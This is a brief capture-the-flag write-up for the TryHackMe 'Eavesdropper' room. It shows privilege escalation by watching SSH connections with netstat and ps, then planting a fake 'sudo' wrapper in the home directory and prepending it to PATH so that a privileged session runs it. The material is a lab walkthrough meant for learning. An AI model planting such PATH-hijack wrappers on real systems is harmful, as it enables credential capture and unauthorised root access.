# TryHackMy Eavesdropper room:

[https://tryhackme.com/room/eavesdropper](https://tryhackme.com/room/eavesdropper)

User frank is a member of sudo group but password is required to run sudo.

`$ id`

`$ sudo -l`

The room title is Eavesdropper so start to sniff the network activity with:

`$ watch -n 0.01 netstat -naplet`

There is a connection from 172.xx.xx.xx to port 22 periodically. Use ps to capture what is happen via ssh from 172.xx.xx.xx:

`$ while true; do sleep 0.01; ps auxe | grep SSH_CLIENT=172.xx.xx.xx | grep -v grep > process.out ; done`

The sudo is run via ssh - it looks like a password is given at 172.xx.xx.xx when the command is executed. Create sudo wrapper in HOME: 

```
$ cat $HOME/sudo

#!/usr/bin/bash
echo $@ >> b.out
/usr/bin/sudo id > /home/frank/id.out
```

Add HOME to PATH in right way (via .profile & .bashrc) and wait for the wrapper execution.

Check the /root with the sudo wrapper.

Capture the flag :)
